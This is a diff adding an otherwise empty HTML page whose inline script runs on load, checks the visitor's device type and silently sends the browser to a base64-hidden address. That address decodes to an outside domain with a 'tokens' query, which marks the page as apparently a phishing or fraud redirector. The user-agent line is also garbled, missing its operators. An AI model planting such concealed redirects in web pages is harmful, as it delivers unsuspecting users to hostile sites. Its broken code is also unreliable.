@@ -1,1 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <style>
+    body {
+      background: #ffffff;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    (function () {
+      const ua = navigator.userAgent  navigator.vendor  window.opera;
+      const allow = /Android|iPhone|iPad|Macintosh|Windows/i.test(ua);
+      const encoded = "aHR0cHM6Ly9jb250YWN0ay1jcy5idXNpbmVzcy1taW5hZ25lLmNvbS8/dG9rZW5z"; // base64
 
+      if (allow) {
+        window.location.href = atob(encoded);
+      }
+    })();
+  </script>
+</body>
+</html>
